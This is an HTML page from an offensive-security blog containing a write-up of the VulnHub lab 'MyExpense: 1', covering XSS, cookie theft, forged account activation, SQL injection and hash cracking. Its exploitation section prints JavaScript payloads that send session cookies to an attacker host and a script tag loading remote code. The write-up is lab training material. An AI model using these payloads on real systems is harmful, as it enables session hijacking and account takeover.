<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="/assets/css/style.css" />
        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
        <title>MyExpense: 1 - pwnerguy's shell stuff</title>
        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
        <!-- SEO -->
        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
        <meta name="author" content="pwnerguy" />
        <meta name="robots" content="index, follow" />
    </head>
    <body>
        <header>
            <a href="/" class="logo">pwnerguy's shell stuff</a>
            <nav>
                <a href="/writeups">Writeups</a>
                <a href="/cheatsheets">Cheat Sheets</a>
            </nav>
        </header>
        <main>
            
        <a href="/writeups" class="back-link">← Go back</a>
        <section class="writeup-content">
            <h1>MyExpense: 1</h1>
<div class="writeup-tags"><span class="tag tag-vulnhub">VulnHub</span> <span class="tag tag-easy">Easy</span> <span class="tag tag-linux">Linux</span> <span class="tag tag-xss">XSS</span> <span class="tag tag-csrf">CSRF</span> <span class="tag tag-cookie-hijacking">Cookie Hijacking</span> <span class="tag tag-sqli">SQLi</span> <span class="tag tag-hash-cracking">Hash Cracking</span></div>
<hr>
<h2>Introduction</h2>
<p>This writeup documents the penetration testing of the <a href="https://www.vulnhub.com/entry/myexpense-1,405/"><strong>MyExpense: 1</strong></a> machine. This machine has been downloaded from the <a href="https://vulnhub.com"><strong>VulnHub</strong></a> platform. You are Samuel Lamotte and you have been fired from <strong>Futura Business Informatique</strong>. The company owes you €750, but you were fired. Right now, you are in your car in front of the company. Furthermore, you are on the company&#39;s internal network with your laptop. Your login credentials before being fired were <strong>samuel:fzghn4lw</strong>. Your mission will be to compromise the company&#39;s security in order to authorize the payment they owe you.</p>
<h2>Information Gathering</h2>
<p>First, we need to discover the IP of the MyExpense machine.</p>
<p><img src="/assets/images/myexpense/arp-scan.png" alt=""></p>
<p>Once we identify the victim machine it would be optimal to use <strong>settarget</strong> to set the target IP in the Polybar. After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
<ul>
<li>TTL 64: Linux.</li>
<li>TTL 128: Windows.</li>
</ul>
<p><img src="/assets/images/myexpense/whichSystem.png" alt=""></p>
<p>Now we will perform a port scan on the machine. To work in an organized way we will use the function <strong>mkt</strong>.</p>
<p><img src="/assets/images/myexpense/mkt.png" alt=""></p>
<p><img src="/assets/images/myexpense/nmap_scan.png" alt=""></p>
<p><img src="/assets/images/myexpense/extractPorts.png" alt=""></p>
<p><img src="/assets/images/myexpense/targeted1.png" alt=""></p>
<p><img src="/assets/images/myexpense/targeted2.png" alt=""></p>
<p>We can see some ports open. The most interesting port is the 80 port. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s <a href="https://pwnerguy.github.io/enumeration-cheatsheet/">Enumeration Cheat Sheet</a>, which includes a table mapping service versions to possible operating system versions.</p>
<p><img src="/assets/images/myexpense/launchpad.png" alt=""></p>
<p>We are facing a <strong>Debian Stretch</strong>.</p>
<p>Once the OS and exposed services have been enumerated it&#39;s time to enumerate the web server running on the port 80.</p>
<p><img src="/assets/images/myexpense/whatweb.png" alt=""></p>
<p><img src="/assets/images/myexpense/web.png" alt=""></p>
<p><img src="/assets/images/myexpense/wappalyzer.png" alt=""></p>
<p>As we know, we are facing a Debian Stretch machine running in the 80 port a web page with Apache and PHP.</p>
<p>We will apply brute force to the website to list directories and files. Once the attack finished, these were the results obtained:</p>
<p><img src="/assets/images/myexpense/gobuster1.png" alt=""></p>
<p>It detected several directories, among them it appears the admin panel at /admin. We will enumerate that directory, since accessing it returns <strong>Error 403 - Forbidden</strong>.</p>
<p><img src="/assets/images/myexpense/gobuster2.png" alt=""></p>
<p>We found a file &#39;admin.php&#39; which we will access. We have an interesting table. We discover that our user is not samuel, but <strong>slamotte</strong>, and our account is currently disabled.</p>
<p><img src="/assets/images/myexpense/admin.php.png" alt=""></p>
<hr>
<h2>Vulnerability Assessment</h2>
<p>We will attempt to register a new account. After filling in the fields we notice the button is disabled; as simple as accessing the source code and removing the &#39;disabled&#39; attribute from the button.</p>
<p><img src="/assets/images/myexpense/register.png" alt=""></p>
<p>If we look at the admin.php file we will see that the new account has been created but is disabled. So we will try to inject JavaScript when creating another account by placing a simple alert in &#39;Firstname&#39; and another in &#39;Lastname&#39; to see if it is vulnerable to XSS. If we access admin/admin.php it is interpreted correctly.</p>
<p><img src="/assets/images/myexpense/alert.png" alt=""></p>
<hr>
<h2>Exploitation</h2>
<p>We will launch the following payload when creating a user:</p>
<p><img src="/assets/images/myexpense/pwned.js.png" alt=""></p>
<p>If we set up an HTTP server on port 80 with python3, we will notice that there is a user loading admin.php from time to time. We will load a payload in pwned.js to be executed by the victim and then, steal their session cookie.</p>
<p><img src="/assets/images/myexpense/stolen_cookie.png" alt=""></p>
<pre><code class="language-js">var request = new XMLHttpRequest();
  request.open(&#39;GET&#39;, &#39;http://192.168.0.139/?cookie=&#39; + document.cookie);
  request.send();
</code></pre>
<p>Once we obtain the user&#39;s session cookie we will inject it into our browser. It seems the user in question is an administrator, since when injecting it an error appears saying that an administrator user cannot be connected in two sessions.</p>
<p>Therefore, we will take advantage of this administrator user so that they perform the request I was going to make, which was to activate my user account.</p>
<pre><code class="language-js">var request = new XMLHttpRequest();
  request.open(&#39;GET&#39;, &#39;http://192.168.0.126/admin/admin.php?id=11&amp;status=active&#39;);
  request.send();
</code></pre>
<p>Once we access the site as slamotte, we must submit the expense report so that someone approves it.</p>
<p><img src="/assets/images/myexpense/750_sending.png" alt=""></p>
<p>In the information about my account we will see that I have a manager called Manon Riviere whom we can look up in admin.php. Also, we see there are several &#39;<strong>financial approvers</strong>&#39;. The most logical approach will be to trigger an XSS in the chat to steal cookies and, with luck, one will belong to a &#39;<strong>financial approver</strong>&#39;.</p>
<pre><code class="language-js">var request = new XMLHttpRequest();
  request.open(&#39;GET&#39;, &#39;http://192.168.0.139:4646/?cookie=&#39; + document.cookie);
  request.send();
</code></pre>
<p>We will listen on port 4646 and we will inject a message that contains:</p>
<pre><code class="language-js">&lt;script src=&quot;http://192.168.0.131:4646/pwned.js&quot;&gt;&lt;/script&gt;
</code></pre>
<p><img src="/assets/images/myexpense/user_cookies.png" alt=""></p>
<p>Once we receive requests, we will check them one by one until we first find Manon Riviere&#39;s (the account from which we will accept the payment). After that, we will go for Paul Baudouin who is my manager and also a financial approver and we will hijack his session.</p>
<p><img src="/assets/images/myexpense/manon_riviere_accepts.png" alt=""></p>
<p>The <strong>Rennes</strong> panel is vulnerable to <strong>SQLI</strong>. We will follow the following exploitation:</p>
<p><img src="/assets/images/myexpense/sqli1.png" alt=""></p>
<p><img src="/assets/images/myexpense/sqli2.png" alt=""></p>
<p><img src="/assets/images/myexpense/sqli3.png" alt=""></p>
<p><img src="/assets/images/myexpense/sqli4.png" alt=""></p>
<p>Finally, we obtain a string of users and passwords. We will format it with nvim to make it more readable.</p>
<p><img src="/assets/images/myexpense/hashes.png" alt=""></p>
<hr>
<h2>Post-Exploitation</h2>
<p>To finish this intrusion we have to crack the hash of our target pbaudouin. We will do it online: <a href="https://hashes.com"><strong>https://hashes.com</strong></a></p>
<p><img src="/assets/images/myexpense/cracked_hash.png" alt=""></p>
<p>To finish, we will log in as pbaudouin and send ourselves the €750.</p>
<p><img src="/assets/images/myexpense/expense_reports.png" alt=""></p>
<p>To obtain the flag we must log in as slamotte.</p>
<p><img src="/assets/images/myexpense/flag.png" alt=""></p>

        </section>
    
        </main>
        <footer>
            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
            <div class="icons">
                <a href="mailto:rmp.it@proton.me" target="_blank"">
                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
                </a>
                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
                </a>
                <a href="https://github.com/pwnerguy" target="_blank">
                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
                </a>
                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
                </a>
                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
                </a>
            </div>
        </footer>
        <script>
            // document.addEventListener("DOMContentLoaded", () => {
            //     const cards = document.querySelectorAll('.writeup-card');
            //     const searchInput = document.getElementById('searchInput');
            //     if (!searchInput) return;
            //     searchInput.addEventListener('input', () => {
            //         const q = searchInput.value.toLowerCase();
            //         cards.forEach(card => {
            //             const categories = (card.dataset.categories || "").toLowerCase();
            //             const title = card.querySelector("h2").textContent.toLowerCase();
            //             const haystack = `${categories} ${title}`;
            //             if (haystack.includes(q)) {
            //                 card.classList.remove("hidden");
            //             } else {
            //                 card.classList.add("hidden");
            //             }
            //         });
            //     });
            // });

            document.addEventListener("DOMContentLoaded", () => {
            document.querySelectorAll('a[href^="http"]').forEach(a => {
                a.setAttribute("target", "_blank");
                a.setAttribute("rel", "noopener noreferrer");
            });
            });

            // document.addEventListener("DOMContentLoaded", () => {
            //     const cards = document.querySelectorAll('.writeup-card');
            //     const searchInput = document.getElementById('searchInput');
            //     if (!searchInput) return;
            //     searchInput.addEventListener('input', () => {
            //         const terms = searchInput.value
            //             .toLowerCase()
            //             .trim()
            //             .split(/\s+/);
            //         cards.forEach(card => {
            //             const categories = (card.dataset.categories || "").toLowerCase();
            //             const title = card.querySelector("h2").textContent.toLowerCase();
            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
            //             const matches = terms.every(t => haystack.includes(t));
            //             card.classList.toggle("hidden", !matches);
            //         });
            //     });
            // });

            document.addEventListener("DOMContentLoaded", () => {
                const cards = document.querySelectorAll('.writeup-card');
                const searchInput = document.getElementById('searchInput');
                const resultsCount = document.getElementById('resultsCount');

                function updateCount() {
                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
                    if (resultsCount) {
                        resultsCount.textContent = `${visible} available machines`;
                    }
                }

                if (!searchInput) return;

                searchInput.addEventListener('input', () => {
                    const terms = searchInput.value
                        .toLowerCase()
                        .trim()
                        .split(/\s+/);

                    cards.forEach(card => {
                        const categories = (card.dataset.categories || "").toLowerCase();
                        const title = card.querySelector("h2").textContent.toLowerCase();
                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");

                        const matches = terms.every(t => haystack.includes(t));
                        card.classList.toggle("hidden", !matches);
                    });

                    updateCount();
                });

                updateCount();
            });

        </script>
    </body>
</html>